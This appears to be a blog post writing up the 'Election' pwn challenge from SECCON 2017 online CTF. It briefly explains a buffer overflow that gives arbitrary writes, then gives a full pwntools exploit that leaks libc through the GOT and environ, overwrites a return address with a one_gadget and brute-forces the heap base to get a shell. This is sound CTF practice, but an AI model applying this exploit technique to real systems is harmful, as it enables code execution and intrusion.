---
layout: post
redirect_from:
  - /blog/2017/12/10/seccon-2017-quals-election/
date: "2017-12-10T15:19:36+09:00"
tags: [ "ctf", "writeup", "seccon", "seccon-quals", "pwn", "buffer-overflow", "heap", "bruteforce" ]
"target_url": [ "https://ctftime.org/event/512/" ]
---

# SECCON 2017 Online CTF: Election

## solution

BOF and bruteforce.

There are a BOF at re-voting for `Ojima`.
This allows us to write anywhere and read somewhere.
Due to FULL RELRO, it's not the flag yet.
We want to get the libc (or heap) base addr.
But if you read the addr simply, then you lose the ability to write.
Here, you can use brutefoce to fix the head address, using $8192$ expected-trials, and get the flag.

## note

[zeosutt](https://twitter.com/zeosutt) and others read the binary and found base solution, and I made the flag using the brute-force attack.
I was faster a little, but he noticed the *neat* solution to get a head address.

## implementation

``` c++
#!/usr/bin/env python2
from pwn import * # https://pypi.python.org/pypi/pwntools
import argparse
parser = argparse.ArgumentParser()
parser.add_argument('host', nargs='?', default='election.pwn.seccon.jp')
parser.add_argument('port', nargs='?', default=28349, type=int)
parser.add_argument('--log-level', default='debug')
parser.add_argument('--binary', default='./election')
parser.add_argument('--libc', default='libc-2.23.so')
args = parser.parse_args()
context.log_level = args.log_level
context.binary = args.binary
elf = ELF(args.binary)
libc = ELF(args.libc)

def solve(p):
    def add(addr, value):
        p.sendlineafter('>> ', '2')
        p.sendlineafter('Show candidates? (Y/n) ', 'n')
        p.sendlineafter('candidate.\n>> ', 'Oshima')
        p.sendlineafter('re-vote?\n>> ', 'yes'.ljust(0x20, '\0') + p64(addr - 0x10) + chr(value))
    def write(addr, s):
        for i, c in enumerate(s):
            for value in [ ord(c) / 2, (ord(c) + 1) / 2 ]:  # to avoid to be nagative
                if value:
                    add(addr + i, value)

    heap_base = 0x0162b000  # fixed
    # heap_base = input()
    # log.info('heap base: %#x', heap_base)

    # make a candidate structure, whose name is `got.__libc_start_mai` and next_candidate is the `list`
    p.sendlineafter('>> ', '1')
    p.sendlineafter('name.\n>> ', '\0')
    write(heap_base + 0xf0, p64(elf.got['__libc_start_main']) + p64(heap_base + 0x90))
    add(elf.symbols['list'], 0x20)
    log.info('%#x', elf.got['__libc_start_main'])

    # read the libc base
    p.sendlineafter('>> ', '2')
    p.sendlineafter('Show candidates? (Y/n) ', 'Y')
    p.recvuntil('Candidates:\n* ')
    libc_base = u64(p.recvline()[: -1].ljust(8, '\0')) - libc.symbols['__libc_start_main']
    p.sendlineafter('candidate.\n>> ', 'NAME')
    log.info('libc base: %#x', libc_base)

    # read the environ
    write(heap_base + 0x10, p64(libc_base + libc.symbols['environ'] - (heap_base + 0x30)))
    p.sendlineafter('>> ', '2')
    p.sendlineafter('Show candidates? (Y/n) ', 'Y')
    p.recvuntil('* Shinonome\n* ')
    environ = u64(p.recvline()[: -1].ljust(8, '\0'))
    p.sendlineafter('candidate.\n>> ', 'NAME')
    log.info('environ: %#x', environ)
    ret_addr = environ - 240
    log.info('return addr: %#x', ret_addr)

    # attack
    one_gadget = 0xf1117
    write(ret_addr, p64(one_gadget - (libc.symbols['__libc_start_main'] + 240)))
    p.sendlineafter('>> ', '0')

    time.sleep(1)
    p.sendline('id')

for iteration in range(10000):
    log.info('iteration: %d', iteration)
    try:
        with remote(args.host, args.port) as p:
            solve(p)
            p.interactive()
            break
    except EOFError:
        pass

```
